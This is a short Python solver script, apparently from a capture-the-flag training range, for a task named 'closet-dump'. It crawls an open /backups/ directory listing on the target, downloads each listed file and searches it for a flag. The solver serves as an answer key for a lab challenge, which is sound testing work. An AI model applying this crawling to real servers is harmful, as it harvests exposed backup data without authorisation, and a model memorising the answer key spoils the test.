"""Intended-path solver: read a leaked dump through the open directory listing."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.get(f"{ctx.url()}/backups/", timeout=10)
    hrefs = re.findall(r'href="(/backups/[^"]+)"', res.text)
    captured = None
    for href in hrefs:
        file_res = httpx.get(f"{ctx.url()}{href}", timeout=10)
        flags = find_flags(file_res.text)
        if flags:
            captured = flags[0]
            break
    return SolveResult(
        results=[
            TaskResult(
                task_id="closet-dump",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in any listed backup file",
            )
        ]
    )
